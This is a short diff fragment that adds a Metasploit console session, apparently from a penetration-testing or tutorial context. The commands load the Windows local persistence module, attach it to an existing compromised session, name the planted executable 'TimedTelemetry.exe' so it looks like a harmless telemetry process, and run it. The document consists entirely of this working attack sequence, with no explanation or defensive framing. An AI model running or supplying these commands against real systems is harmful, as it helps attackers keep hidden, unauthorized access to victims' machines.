@@ -1,0 +1,6 @@
+```msf
+msf6 > search persistence platform:windows
+msf6 exploit(multi/handler) > use exploit/windows/local/persistence
+msf6 exploit(windows/local/persistence) > set SESSION 1
+msf6 exploit(windows/local/persistence) > set REXENAME TimedTelemetry.exe
+msf6 exploit(windows/local/persistence) > run
